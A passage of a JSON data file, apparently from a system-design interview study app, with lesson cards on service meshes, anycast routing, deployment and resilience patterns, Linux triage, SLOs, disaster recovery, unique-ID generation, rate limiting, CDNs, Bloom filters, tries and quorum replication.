      "section": "Part 11 · Networking",
      "whatItIs": "Dedicated infrastructure layer consisting of sidecar proxies (Envoy) deployed alongside microservices to handle service-to-service communication.",
      "architecture": "DATA PLANE & CONTROL PLANE:\nControl Plane (Istio) ──pushes certificates & routing rules──►\n  [Service A + Envoy Sidecar] ◄──mTLS encrypted──► [Service B + Envoy Sidecar]\nApp code communicates over localhost; Sidecar handles mTLS, retries, timeouts, telemetry, and circuit breaking!",
      "tradeoffs": [
        "Adopt a Mesh When: Polyglot microservices in multiple languages; strict corporate mTLS requirements; dynamic canary traffic shifting",
        "Avoid a Mesh When: Small monolithic team; sub-millisecond latency budgets (Sidecar adds ~1ms per hop, doubled because both ends proxy!)",
        "Resource Cost: 1 sidecar per pod consumes hundreds of MBs RAM and CPU; at 5,000 pods this represents significant cluster overhead"
      ],
      "keyTakeaway": "A service mesh moves transport concerns out of application code into a uniform layer. North-south traffic belongs at the API Gateway; east-west belongs in the Mesh."
    },
    {
      "id": "11.4",
      "tabTitle": "11.4 Anycast & BGP",
      "title": "11.4 Global Traffic Management: Anycast, BGP and GSLB",
      "section": "Part 11 · Networking",
      "whatItIs": "Mechanisms for routing global client traffic to the closest geographical Point of Presence (PoP) or datacenter.",
      "architecture": "ANYCAST ROUTING FLOW:\nSame IP address (e.g. 1.1.1.1) announced via BGP from 200+ PoPs worldwide.\n• User in Tokyo → Internet BGP routes to Tokyo PoP (lowest AS hops)\n• User in London → Internet BGP routes to London PoP\n• PoP Failure: Stop announcing BGP prefix from London → Routers immediately reconverge in seconds to Frankfurt. Zero DNS TTL wait!",
      "tradeoffs": [
        "Anycast + BGP (Sub-second failover, no client cooperation, but routes by AS hops not latency; long-lived TCP connection resets if route flaps)",
        "DNS-based GSLB (Works everywhere, supports geo-pinning and weights, but failover takes minutes due to resolver TTL caching)",
        "The Practical Combination: Anycast for edge CDN/DNS; DNS GSLB for steering between regional backend clusters"
      ],
      "keyTakeaway": "DNS steers in minutes; anycast steers in seconds. Use DNS for policy and anycast for fast edge evacuation. Moving traffic is easy; moving the stateful write path is hard."
    },
    {
      "id": "11.6",
      "tabTitle": "11.6 WebRTC Media",
      "title": "11.6 WebRTC and Real-Time Media",
      "section": "Part 11 · Networking",
      "whatItIs": "Browser-native framework for real-time audio, video, and data communication with sub-150ms latency.",
      "architecture": "MEDIA TOPOLOGIES:\n• Mesh (P2P): Each peer sends stream to every other peer. (Zero server media cost, but uplink dies at ~4 participants)\n• SFU (Selective Forwarding Unit): Peers send 1 upstream; SFU selectively forwards streams down to participants without transcoding (The Industry Standard for Zoom/Meet)\n• MCU (Multipoint Control Unit): Server decodes, composites, and re-encodes single mixed stream (CPU intensive)\n• NAT Traversal: STUN (discovers public IP) + TURN (relay server when direct UDP blocked; 10–20% of traffic)",
      "tradeoffs": [
        "Simulcast: Sender publishes 3 resolutions (1080p, 720p, 360p); SFU forwards appropriate quality based on each receiver's downlink",
        "WebRTC vs. HLS/DASH (WebRTC sub-150ms latency for bidirectional conversation; HLS for one-to-many broadcast caching over CDNs)"
      ],
      "keyTakeaway": "WebRTC provides encrypted media and NAT traversal but leaves signaling to you. Topology: Mesh for 1:1, SFU with simulcast for group video calls, HLS for mass broadcast."
    }
  ],
  "19": [
    {
      "id": "8.1",
      "tabTitle": "8.1 Deploy Patterns",
      "title": "8.1 Deployment Strategies & Zero Downtime",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "Techniques for releasing new software versions to production while minimizing risk, blast radius, and customer downtime.",
      "architecture": "DEPLOYMENT SPECTRUM:\n• Rolling: Gradually replaces instances (V1 V1 → V2 V1 → V2 V2). No extra infra cost; V1 and V2 coexist.\n• Blue/Green: Two identical environments. Load balancer flips traffic 100% Blue → Green. Instant rollback; 2× infra cost.\n• Canary: Routes 5% traffic to V2 canary nodes → monitors metrics → ramps to 100%. Smallest blast radius.\n• Shadow (Dark Launch): Clones production traffic to V2; discards V2 response. Validates performance without user impact.",
      "tradeoffs": [
        "Database Schema Migrations (The Expand-Contract Pattern: 1. Add nullable column; 2. Deploy app writing to both; 3. Backfill; 4. Switch reads; 5. Drop old column)",
        "Decoupling Deploy from Release: Deploy code behind feature flags so rollbacks are instantaneous config flips (seconds) rather than redeploys (minutes)"
      ],
      "keyTakeaway": "Always connect deployment strategy choice to: Traffic → Risk → Monitoring → Rollback → Database Compatibility. Never drop columns in a single step."
    },
    {
      "id": "8.2",
      "tabTitle": "8.2 Resilience Patterns",
      "title": "8.2 Resilience: Timeouts, Retries, Circuit Breakers, Backpressure",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "Defensive mechanisms that prevent transient failures from escalating into catastrophic cascading system collapse.",
      "architecture": "CASCADING COLLAPSE & THE CIRCUIT BREAKER:\nService B slows → Service A threads block → Clients timeout and retry → Traffic triples → B collapses → System OOM!\nCIRCUIT BREAKER STATE MACHINE:\n[CLOSED: Healthy] ──failure rate > 50%──► [OPEN: Fail Fast immediately]\n                                              │\n                                         cool-down 30s\n                                              ▼\n                                        [HALF-OPEN: Probe trial calls] ──success──► CLOSED",
      "tradeoffs": [
        "Exponential Backoff with JITTER: Jitter is mandatory! Without randomized jitter, retrying clients synchronize into thundering herds",
        "Retry Budget: Cap retries as a fraction of total traffic (e.g. max 10%) so retries cannot amplify load on a struggling downstream dependency",
        "Degrade, Don't Fail: Serve stale cache, omit recommendation widgets, or queue writes rather than returning a 500 error"
      ],
      "keyTakeaway": "Every remote call needs a timeout, a bounded retry with jitter, a breaker, and a defined degraded mode. Cascading failures are almost always caused by retries amplifying load."
    },
    {
      "id": "8.3",
      "tabTitle": "8.3 Linux Triage",
      "title": "8.3 Diagnosing a Runaway Process on Linux",
      "section": "Part 8 · Deployment, Reliability & Operations",
      "whatItIs": "A methodical 4-step triage sequence for diagnosing mysterious production performance degradation on Linux hosts.",
      "architecture": "REPEATABLE TRIAGE ORDER:\n1. SATURATION: `uptime`, `vmstat 1` (Check load average vs. core count; run queue `r`)\n2. WHICH RESOURCE:\n   • CPU: `top`, `pidstat -u` (User vs. System vs. iowait)\n   • Memory: `free -m`, `vmstat` (Swap si/so > 0? OOM killer in dmesg?)\n   • Disk: `iostat -xz 1` (%util near 100%? await climbing?)\n   • Network: `ss -s` (Socket states, TIME_WAIT accumulation)\n3. WHICH PROCESS: `pidstat 1`, `top -H` (Per-thread CPU)\n4. WHAT IS IT DOING: `strace -p PID`, `perf top`, `jstack`/`py-spy` thread dumps, `lsof -p PID`",
      "tradeoffs": [
        "Load Average Trap: Load average includes tasks in uninterruptible sleep (I/O wait or stuck NFS mount) without consuming CPU",
        "Containers & Cgroups: `top` inside a container shows host memory; check cgroup limits in `/sys/fs/cgroup` to see why OOM-killer fired"
      ],
      "keyTakeaway": "Have a triage order, not a tool list: saturation → which resource → which process → which syscall or stack trace."
    }
  ],
  "20": [
    {
      "id": "12.3",
      "tabTitle": "12.3 SLIs & SLOs",
      "title": "12.3 SLIs, SLOs and Error Budgets",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Quantifiable engineering standards for measuring user experience and establishing an error budget policy between velocity and reliability.",
      "architecture": "FORMULATIONS:\n• SLI (Indicator): Proportion over threshold, e.g., (Valid requests under 200ms) / (Total valid requests)\n• SLO (Objective): Target goal, e.g., 99.9% availability over rolling 28 days\n• Error Budget: 100% - 99.9% = 0.1% allowed failures (~40 mins downtime/month)\n• Burn-Rate Alerting: Alert based on how fast error budget is consumed:\n  1× burn rate = budget lasts 28 days | 14.4× burn rate = budget gone in 2 days (PAGE)",
      "tradeoffs": [
        "Never Write an SLO on an Average (Average latency hides the p99 tail where 5% of users wait 4 seconds; use percentiles)",
        "Measuring Where the User Is: Measuring server-side only excludes DNS, TLS, and network delays felt by clients",
        "Error Budget Policy: Budget remaining means you can ship faster; budget exhausted halts feature releases for reliability sprints"
      ],
      "keyTakeaway": "Express an SLO as a proportion over a threshold across a rolling window, measured where the user is. The error budget turns reliability into a spendable currency."
    },
    {
      "id": "12.4",
      "tabTitle": "12.4 Multi-Region DR",
      "title": "12.4 Multi-Region Architecture and Disaster Recovery",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "Designing multi-datacenter topologies capable of surviving the total loss of an entire cloud region without permanent data loss.",
      "architecture": "ACTIVE-ACTIVE READS, SINGLE WRITE REGION:\nEU User ──5ms──► EU Replica (local read) | US User ──5ms──► US Primary (local read)\nEU User ──90ms write──► US Write Region ──async replication──► EU Replica (lags 50-200ms)\nReads are instant worldwide; single write authority eliminates multi-master conflict resolution!\nRead-your-own-writes handled by reading from primary for 5s after user mutates state.",
      "tradeoffs": [
        "Four DR Patterns: 1. Backup & Restore (Hours/days, cheap); 2. Pilot Light (Minutes); 3. Active-Passive (Seconds RTO); 4. Full Active-Active (Instant, massive complexity)",
        "Data Problem in Regional Failover: Moving traffic takes seconds with Anycast; moving the database write path requires quorum promotion, fencing, and accepting RPO data loss",
        "Split-Brain Danger: Two regions both promoting themselves as write leader corrupts data; require 3-region quorum or human break-glass confirmation"
      ],
      "keyTakeaway": "State the DR pattern with its RPO, RTO, and cost. Default to local reads with a single write region; reserve full active-active for data that can be merged safely."
    },
    {
      "id": "12.7",
      "tabTitle": "12.7 Chaos Engineering",
      "title": "12.7 Chaos Engineering and Game Days",
      "section": "Part 12 · Reliability & Operations at Scale",
      "whatItIs": "The discipline of experimenting on a distributed system to build confidence in its capability to withstand turbulent production conditions.",
      "architecture": "THE 6-STEP EXPERIMENT METHOD:\n1. Steady State: Define metric meaning 'healthy' (e.g. checkout success rate ≥ 99.5%, p99 ≤ 400ms)\n2. Hypothesis: 'If 1 payment node dies, checkout success stays ≥ 99.5% because LB ejects it within 10s'\n3. Blast Radius: Smallest injection testing hypothesis; define abort condition BEFORE starting\n4. Inject Failure: One variable only, during business hours with team observing\n5. Observe: Did steady state hold? If not, defect discovered for free!\n6. Fix & Automate: Remediate architecture and convert into automated regression test.",
      "tradeoffs": [
        "Chaos vs. Testing: Testing verifies code against specifications; Chaos verifies that complex system configurations and fallbacks hold in practice",
        "Highest-Yield First Experiments: Killing the caching cluster and simulating regional network blackholes (The two failures designs assume away)"
      ],
      "keyTakeaway": "Chaos engineering is a hypothesis-driven experiment with a defined blast radius and abort switch, not randomly breaking production. Untested recovery paths do not work."
    }
  ],
  "21": [
    {
      "id": "rev-3",
      "tabTitle": "Drills & Recall",
      "title": "Revision Day 3 · Distributed Consensus, Kafka & Multi-Region",
      "section": "Week 3 Review & Active Recall",
      "whatItIs": "Consolidation drills on Week 3 systems concepts: Raft consensus, zero-copy Kafka mechanics, service mesh tradeoffs, and multi-region disaster recovery.",
      "architecture": "WEEK 3 RAPID AUDIT:\n✓ Raft leader election and log replication invariants\n✓ Lamport timestamps vs. Vector clocks concurrency detection\n✓ Zero-copy sendfile syscall vs. user-space socket buffers\n✓ 2PC blocking coordination vs. Saga compensating workflows\n✓ Service mesh sidecar latency overhead vs. mTLS benefits\n✓ Multi-region RPO/RTO trade-offs and Anycast failover",
      "tradeoffs": [
        "Whiteboard Drill: Walking through a 3-datacenter Raft cluster partition scenario step-by-step",
        "Architecture Drill: Designing an active-active read / single-write-region database replication flow"
      ],
      "keyTakeaway": "Staff engineers excel at distributed failure scenarios: explaining what happens when leaders crash, partitions isolate quorums, or clocks drift."
    },
    {
      "id": "rev-3-checklist",
      "tabTitle": "Week 3 Checklist",
      "title": "Week 3 Core Mastery Checklist",
      "section": "Week 3 Review & Active Recall",
      "whatItIs": "Self-assessment checklist to verify mastery over advanced distributed systems, storage, and networking.",
      "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you state the formula for Raft quorum and explain why even node counts hurt?\n[ ] Can you diagram how sendfile() transfers disk blocks to the network socket?\n[ ] Can you design a transactional outbox table and explain what bug it fixes?\n[ ] Can you explain how BGP Anycast achieves sub-second failover without DNS caching delays?\n[ ] Can you explain the difference between SLI, SLO, SLA, and error budget burn rates?",
      "tradeoffs": [
        "Theory vs. Practical engineering: Always quote numbers (e.g. 1ms sidecar overhead, 150ms cross-continent WAN RTT)",
        "Sagas vs 2PC: Defend Sagas when services cross administrative or database boundaries"
      ],
      "keyTakeaway": "Consensus and coordination are the backbone of distributed infrastructure. Fluency here is what unlocks staff-level interview evaluations."
    }
  ],
  "22": [
    {
      "id": "4.10",
      "tabTitle": "4.10 Unique IDs",
      "title": "4.10 Generating Globally Unique IDs",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Generating 64-bit sortable, collision-free numeric IDs across distributed clusters at millions of requests per second without coordination bottlenecks.",
      "architecture": "TWITTER SNOWFLAKE 64-BIT LAYOUT:\n 1 bit  | 41 bits timestamp (ms) | 10 bits machine ID | 12 bits sequence\n [ 0 ]  | [ 69 years from epoch ] | [ 1,024 nodes ]   | [ 4,096 IDs/node/ms ]\nCapacity: ~4.1 Million IDs per second per machine!\nLocal generation: Zero network round-trips on ID creation path!",
      "tradeoffs": [
        "Snowflake vs. UUIDv4 (128-bit random UUIDs fragment B-Tree index pages due to random writes; 64-bit Snowflake IDs append to index leaf edge)",
        "The Two Failure Modes: 1. Clock Skew / NTP rollback (refuse to generate IDs if `now < last_ms`); 2. Duplicate Machine IDs (assign via ZooKeeper/etcd lease)",
        "Rough Time Ordering: IDs sort naturally by creation timestamp, enabling O(1) cursor pagination (`WHERE id < :last_seen_id`)"
      ],
      "keyTakeaway": "Restate requirements: unique, roughly sortable, 64-bit numeric, zero network hop per ID — and Snowflake falls out as the answer. Volunteer clock skew and machine ID allocation."
    },
    {
      "id": "kgs-base62",
      "tabTitle": "KGS & Base62",
      "title": "Base62 Encoding & Key Generation Service (KGS)",
      "section": "Architecture & Key Encoding",
      "whatItIs": "Pre-generating compact alphanumeric short keys (Base62: [a-zA-Z0-9]) to eliminate runtime collision checks during high-throughput URL shortening.",
      "architecture": "KEY GENERATION SERVICE ARCHITECTURE:\nKGS Worker Pool ──pre-generates Base62 keys──► Key DB [Used: false, Key: '7bXq9A']\n                          │\n                          ▼\n              Loads key blocks into RAM\n                          │\nTinyURL Web Nodes ◄──fetch block (1,000 keys)──\n• Web node serves URL shortens instantly from memory with zero database collisions!",
      "tradeoffs": [
        "Pre-Generated Keys vs. MD5/SHA256 Hash Truncation (Hashing requires base62 encoding + collision retry query loops; KGS eliminates collision queries entirely)",
        "HTTP 301 Permanent Redirect (Browser caches redirect; zero server load, but blinds analytics) vs. HTTP 302 Temporary Redirect (Server tracks every click and user agent)"
      ],
      "keyTakeaway": "Pre-allocating key ranges in memory turns an expensive distributed synchronization problem into a fast local memory lookup."
    }
  ],
  "23": [
    {
      "id": "3.4",
      "tabTitle": "3.4 Rate Limiting",
      "title": "3.4 Rate Limiting Algorithms",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Techniques for controlling traffic rate, protecting backend capacity, enforcing fair tenant quotas, and blunting credential stuffing attacks.",
      "architecture": "ALGORITHMS COMPARED:\n• Token Bucket: Refill at fixed rate; burst up to bucket capacity (Industry default, e.g. Stripe)\n• Leaky Bucket: FIFO queue drains at constant rate; smooths out bursts into steady stream\n• Fixed Window: Counter per window; vulnerable to 2× burst at window boundaries!\n• Sliding Window Counter: Weighted sum of current + previous window; accurate and memory-efficient\nATOMIC REDIS TOKEN BUCKET (Lua):\nlocal tokens = redis.call('get', key); tokens = min(burst, tokens + elapsed*rate)\nif tokens >= 1 then redis.call('set', key, tokens - 1); return 1 else return 0 end",
      "tradeoffs": [
        "Where to Enforce: Edge CDN (volumetric DDoS) → API Gateway (per-user/IP quotas) → Internal Service (per-tenant DB query limits)",
        "Fail-Open vs. Fail-Closed: If Redis cluster dies, failing closed causes a full outage; usually fail-open with conservative local limits",
        "Rate Limiting vs. Load Shedding: Rate limiting enforces fairness per client; load shedding drops excess traffic when system is overloaded regardless of caller"
      ],
      "keyTakeaway": "Token bucket at the gateway, keyed per tenant, with distributed counters in Redis and a local in-process lease for speed. Return 429 with Retry-After headers."
    },
    {
      "id": "11.2-gw",
      "tabTitle": "11.2 Edge Gateways",
      "title": "11.2 API Gateways & Reverse Proxies",
      "section": "Part 11 · Networking",
      "whatItIs": "The front door of modern distributed systems, decoupling client interfaces from internal microservice topologies.",
      "architecture": "INGRESS TIERS:\nClient ──► CDN (static cache, DDoS) ──► L4 LB (NLB Anycast) ──► API Gateway (Envoy/Kong) ──► Microservices\n• Gateway handles: TLS offloading, token validation (JWT), rate limiting, path-based routing, request shaping\n• Internal services receive validated identity headers (`X-User-Id`), skipping duplicated auth checks",
      "tradeoffs": [
        "Authentication at Edge vs. Authorization in Service (Validate credentials once at gateway; enforce object-level data permissions inside domain services)",
        "Backend-for-Frontend (BFF): Dedicated thin aggregation gateway for mobile (coarse payloads, low bandwidth) vs. web applications"
      ],
      "keyTakeaway": "The gateway answers: 'Who are you and may you make this call at this rate?' The service answers: 'May you do this to THIS object?' Never put business logic in the gateway."
    }
  ],
  "24": [
    {
      "id": "2.5",
      "tabTitle": "2.5 CDN Architecture",
      "title": "2.5 Content Delivery Networks (CDN)",
      "section": "Part 2 · Networking & Protocols",
      "whatItIs": "A globally distributed network of edge cache proxy servers delivering static and dynamic content with minimum latency.",
      "architecture": "CDN HIERARCHY & ORIGIN SHIELDING:\nClient (Tokyo) ──► Edge PoP (Tokyo, ~10ms)\n                     │ miss\n                     ▼\n                 Regional Cache (Asia, ~30ms)\n                     │ miss\n                     ▼\n                 Origin Shield Cache (~60ms) ──► Origin Server (London, ~180ms)\nOrigin Shield collapses hundreds of worldwide edge misses into ONE single request to your origin!",
      "tradeoffs": [
        "Hit Ratio is the Game: 90%+ offload protects origin. Cache-key pollution (tracking params, over-broad Vary: User-Agent) destroys hit ratios",
        "Dynamic Content Acceleration: Terminating TLS at edge PoP removes handshake RTTs over long-haul WAN; uses optimized persistent TCP connections to origin",
        "Purging: Prefer immutable versioned URLs (`app.9f3ac1.js`) with 1-year TTL over expensive wildcard cache purges"
      ],
      "keyTakeaway": "A CDN is a hierarchical cache plus a routing decision: Anycast/DNS picks nearest edge, each tier shields the tier behind it. Cache key hygiene dictates system hit ratio."
    },
    {
      "id": "11.4-anycast",
      "tabTitle": "11.4 Anycast & BGP",
      "title": "11.4 Global Traffic Management with Anycast",
      "section": "Part 11 · Networking",
      "whatItIs": "Steering users to the topologically nearest edge server using BGP Anycast routing for sub-second failover.",
      "architecture": "ANYCAST ROUTING MECHANICS:\n• Single IP address announced from 150+ edge datacenters worldwide via BGP\n• Internet routers route each client to topologically closest PoP via shortest AS-path\n• If PoP fails: Withdrawing the BGP route prefix causes internet routers to re-route to next closest PoP within seconds!",
      "tradeoffs": [
        "Anycast (Seconds failover, no DNS caching delays) vs. DNS Routing (Minutes failover due to ISP resolver TTL disrespect)",
        "Route Flapping: Anycast routes by AS hops, not latency; routing flaps can reset long-lived stateful TCP connections"
      ],
      "keyTakeaway": "DNS steers in minutes; Anycast steers in seconds. Use Anycast for edge CDN ingress and fast regional evacuation."
    }
  ],
  "25": [
    {
      "id": "5.4",
      "tabTitle": "5.4 Why Redis Fast",
      "title": "5.4 Why Redis Is So Fast",
      "section": "Part 5 · Caching",
      "whatItIs": "The three core architectural reasons behind Redis's sub-millisecond execution and deterministic high throughput.",
      "architecture": "THE THREE PILLARS:\n1. RAM Access: RAM random reads take ~100ns vs. NVMe SSDs taking ~16–100µs (100–1,000× faster)\n2. Lock-Free Single Thread Loop: Execution runs on one thread via `epoll`/`kqueue`. No locks, no mutexes, no context switching, atomic commands!\n3. Adaptive Internal Encodings:\n   • Small hashes/zsets → listpack (contiguous memory, cache-friendly linear scan)\n   • Large hashes → hashtables; Large zsets → skiplist + hashtable",
      "tradeoffs": [
        "Single-Threaded Benefit (Every command is atomic: `INCR`, `SETNX`, Lua scripts are free of race conditions) vs. Pitfall (Slow O(N) commands like `KEYS *` block all clients)",
        "Scaling Past One Node: Redis Cluster shards 16,384 hash slots across nodes; multi-key operations require hash tags: `user:{123}:profile`"
      ],
      "keyTakeaway": "RAM + lock-free event loop + adaptive data structures. Single-threading buys atomicity and predictable latency, making Redis the ideal primitive for locks and counters."
    },
    {
      "id": "5.5-cache",
      "tabTitle": "5.5 Bloom Filters",
      "title": "5.5 Bloom Filters for Cache Penetration Defense",
      "section": "Part 5 · Caching",
      "whatItIs": "Probabilistic memory-efficient bit array that tests set membership with zero false negatives and tunable false positives.",
      "architecture": "BLOOM FILTER MECHANICS:\nBit Vector of $m$ bits initialized to 0. Feed input through $k$ independent hash functions:\n• Insert: Hash element with $h_1..h_k$, set corresponding bit positions to 1\n• Query: Hash element with $h_1..h_k$. If ANY bit is 0 → DEFINITELY NOT IN SET (drop query!)\n• If all bits are 1 → PROBABLY IN SET (query cache/DB)",
      "tradeoffs": [
        "Defending Against Cache Penetration: Filter rejects nonexistent IDs in memory before hitting DB; prevents malicious miss attacks",
        "Sizing Formula: Optimal hash count $k = (m/n) \\cdot \\ln 2 \\approx 0.693 \\cdot (m/n)$. ~10 bits per element achieves a 1% false positive rate!"
      ],
      "keyTakeaway": "A bloom filter trades a bounded false-positive rate for order-of-magnitude memory savings, with zero false negatives. Use it as a lightweight pre-filter in front of expensive storage."
    }
  ],
  "26": [
    {
      "id": "5.5-crawler",
      "tabTitle": "5.5 URL Deduplication",
      "title": "5.5 Bloom Filters: Avoiding Duplicate URL Crawls",
      "section": "Part 5 · Caching & Indexing",
      "whatItIs": "Preventing web crawlers from re-crawling billions of duplicate URLs using memory-compact bit vectors.",
      "architecture": "1 BILLION URLS SIZING MATH:\nTarget: 1 Billion URLs, 1% false positive probability ($p = 0.01$)\nFormula: $m = -(n \\cdot \\ln p) / (\\ln 2)^2 \\approx 9.6 \\times 10^9$ bits $\\approx$ 1.2 GB RAM!\nOptimal hashes: $k = 0.693 \\times (9.6/1) \\approx 7$ hash functions\nCompare: Storing 1 Billion URLs (70 bytes each) in a hash set requires 70+ GB of memory!",
      "tradeoffs": [
        "False Positive Cost in Crawling: A URL is falsely assumed to be visited and skipped; acceptable for broad crawling, but targeted crawls verify against DB",
        "Inability to Delete: Standard Bloom filters cannot delete bits (clearing a bit breaks other elements). Solution: Counting Bloom filters or periodic rebuilds"
      ],
      "keyTakeaway": "1.2 GB of RAM deduplicates 1 billion URLs with a 1% false positive rate. Always quote the 10-bits-per-element rule in web crawler interviews."
    },
    {
      "id": "4.12-indexer",
      "tabTitle": "4.12 Inverted Index",
      "title": "4.12 Big Data Distributed Inverted Indexing",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Building distributed full-text search indexes across web documents using MapReduce batch pipelines and posting list shards.",
      "architecture": "INVERTED INDEX PIPELINE:\nHTML Documents ──► Map (Tokenize, Stem, Extract terms) ──► [term, doc_id, position]\n                        │\n                        ▼\nShuffle & Sort by Term ──► Reduce ──► Posting List: 'distributed' → [Doc 1, Doc 4, Doc 9...]\nPosting lists partitioned across search cluster nodes by term hash or document ID.",
      "tradeoffs": [
        "Partition by Document (Local index on each shard; scatter-gather search across all nodes) vs. Partition by Term (Single node holds term's entire posting list, but creates hot terms)",
        "Real-Time Indexing: Memory buffer (In-memory segment) + commit log for fresh documents, merged into immutable segments via background compaction"
      ],
      "keyTakeaway": "Search indexing separates tokenization from posting list storage. Use document-partitioned shards with scatter-gather for balanced indexing throughput."
    }
  ],
  "27": [
    {
      "id": "1.6-trie",
      "tabTitle": "1.6 Big Data Storage",
      "title": "1.6 Big Data Analytics for Search Logs",
      "section": "Part 1 · Compute Foundations",
      "whatItIs": "Processing billions of raw search keystrokes and queries to generate prefix frequency aggregations.",
      "architecture": "BATCH AGGREGATION ARCHITECTURE:\nSearch Queries ──► Kafka ──► S3 Data Lake (Parquet format) ──► Spark Weekly Batch Job\nSpark computes top-5 historical query completions for every prefix ──► Serializes updated Trie ──► Uploads to In-Memory Trie Serving Cluster",
      "tradeoffs": [
        "Data Warehouse vs. Data Lakehouse for Query Logs (S3 + Parquet gives cheap storage; Spark reads columnar slices efficiently)",
        "Weekly Batch vs. Real-Time Streaming (Historical search trends change slowly; batch updates avoid complex distributed state synchronization)"
      ],
      "keyTakeaway": "Keep offline analytics separate from the online serving path. Process heavy prefix ranking aggregations offline in Spark."
    },
    {
      "id": "trie-arch",
      "tabTitle": "Prefix Trie Internals",
      "title": "In-Memory Prefix Trie & Top-K Node Caching",
      "section": "Data Structures & Prefix Search",
      "whatItIs": "Prefix tree data structure optimized for sub-30ms autocomplete suggestions by caching top-K completions on each branch node.",
      "architecture": "TOP-K TRIE NODE STRUCTURE:\n       [root]\n      /   \\\n    's'   'g'\n    /       \\\n  [s]       [g]\n  top_5:    top_5:\n  ['system', 'google', 'gmail...]\nKeystroke query 'sys' directly reads top-5 list at node 's-y-s' in O(prefix_length) time without traversing children!",
      "tradeoffs": [
        "Trie Node Top-K Caching (Drastically improves read latency from $O(V+E)$ to $O(L)$, at the cost of additional node memory overhead)",
        "Handling Sensitive & Trending Queries: Filter bad queries via blacklist in Redis; inject real-time breaking news via ephemeral cache overlay"
      ],
      "keyTakeaway": "Precomputing top-K results directly on Trie nodes eliminates subtree traversals during live search queries."
    }
  ],
  "28": [
    {
      "id": "rev-4",
      "tabTitle": "Whiteboard Mocks",
      "title": "Revision Day 4 · Ingress, Caching & Search Timed Mocks",
      "section": "Week 4 Review & Applied Drills",
      "whatItIs": "Timed 45-minute whiteboard simulations covering Week 4 applied designs: TinyURL, Rate Limiter, CDN, Distributed Cache, Web Crawler, and Autocomplete.",
      "architecture": "WEEK 4 DRILL TARGETS:\n• TinyURL: 45-min mock; derive Base62 KGS pre-allocation in RAM; defend HTTP 301 vs. 302\n• API Rate Limiter: Write atomic Redis Lua script for token bucket; design Envoy gateway gRPC filter\n• Autocomplete: Diagram serialized Trie in memory with top-5 query caching; budget memory for 10M prefixes\n• CDN: Trace cache miss from Edge PoP to Regional Shield to Origin; design tag-based soft purging",
      "tradeoffs": [
        "Interview Pacing: 8m requirements & scale → 7m API → 15m architecture → 15m deep dive bottlenecks",
        "Proactive Trade-offs: Contrast distributed Redis locks with single-flight mutex request coalescing"
      ],
      "keyTakeaway": "Simulate real interview pressure: talk out loud, draw clean ASCII boxes, and justify every architectural component with numerical scale."
    },
    {
      "id": "rev-4-cheat",
      "tabTitle": "C.1 & C.2 Cheat Sheet",
      "title": "Appendix C Cheat Sheet & Tip-of-the-Tongue Numbers",
      "section": "Week 4 Review & Applied Drills",
      "whatItIs": "Quick-reference memory drill for essential latency numbers and standardized interview response phrases.",
      "architecture": "TIP-OF-THE-TONGUE NUMBERS:\n• RAM Read: 100 ns | SSD Read: ~16–100 µs | Intra-DC RTT: ~0.5 ms | Cross-Continent: ~150 ms\n• Traffic: 1 M/day ≈ 12 QPS | 1 B/day ≈ 12 K QPS | 1 KB × 10K QPS ≈ 80 MBPS\n• Availability: 99.9% = 43.8 min/month | 99.99% = 4.4 min/month\n• Bloom Filter: ~10 bits/element buys 1% false positive rate",
      "tradeoffs": [
        "Opening Phrase: 'Before I design, let me pin down functional requirements and non-functional targets: QPS, p99 latency, and consistency.'",
        "Closing Phrase: 'The main trade-offs I made were X and Y. With more time, I would examine Z.'"
      ],
      "keyTakeaway": "Having concrete numbers ready on the tip of your tongue instantly distinguishes senior candidates from mid-level engineers."
    }
  ],
  "29": [
    {
      "id": "10.3",
      "tabTitle": "10.3 Conflict Resolution",
      "title": "10.3 Conflict Resolution and Anti-Entropy",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Background protocols and algebraic data types for reconciling diverging replicas in leaderless, multi-master storage systems.",
      "architecture": "THREE REPAIR MECHANISMS (CHEAPEST FIRST):\n1. Read Repair: Opportunistic on read path. Client receives quorum responses (v7, v7, v5) → returns v7 and pushes v7 to lagging replica in background (Near zero cost!)\n2. Hinted Handoff: Short write outage. Coordinator stores temporary 'hint' on local disk; replays to replica once back online\n3. Merkle Tree Sync: Full anti-entropy comparison for long divergence. Replicas compare root hashes; descend only differing branch subtrees to sync data!",
      "tradeoffs": [
        "Last-Write-Wins (Simple, but silently discards concurrent updates due to clock drift) vs. Multi-Version Sibling Values",
        "Conflict-Free Replicated Data Types (CRDTs): Commutative and associative merge functions guarantee convergence, but cannot enforce invariants like 'balance ≥ 0'",
        "Deletes in Distributed Stores: Deletes must be written as tombstones and retained until anti-entropy repair finishes, otherwise deleted rows get resurrected!"
      ],
      "keyTakeaway": "Divergence in multi-master systems is a state to resolve, not a bug. Use read repair for hot data, hinted handoff for blips, and Merkle tree sync for cold data."
    },
    {
      "id": "4.3-quorum",
      "tabTitle": "4.3 Tunable Quorums",
      "title": "4.3 Tunable Quorum Math in Key-Value Stores",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Configuring replica read/write quorum sizes ($R$, $W$, $N$) to dial between strict linearizability and high write availability.",
      "architecture": "QUORUM MATHEMATICS:\nTotal Replicas = N (typically 3 or 5)\nWrite Quorum = W (nodes acknowledging write before success)\nRead Quorum = R (nodes queried on read)\n• If R + W > N: Overlap is guaranteed! At least 1 node in read set contains latest write (Strong Consistency)\n• If W = 1, R = 1: Lowest latency and maximum availability, but reads may return stale data (Eventual Consistency)",
      "tradeoffs": [
        "High Write Availability ($W=1$): Absorbs network partitions, but requires background read repair and anti-entropy to resolve conflicts",
        "Leaderless Replication vs. Leader-Based: Leaderless eliminates single write bottlenecks at the expense of client-side conflict resolution complexity"
      ],
      "keyTakeaway": "Quorum math ($R + W > N$) lets you tune consistency per operation: strong consistency for checkout payments, low latency for browsing."
    }
  ],
  "30": [
    {
      "id": "6.4",
      "tabTitle": "6.4 Multipart Upload",
      "title": "6.4 Uploading Large Files (Multipart Upload)",
      "section": "Part 6 · Storage Systems & Object Storage",
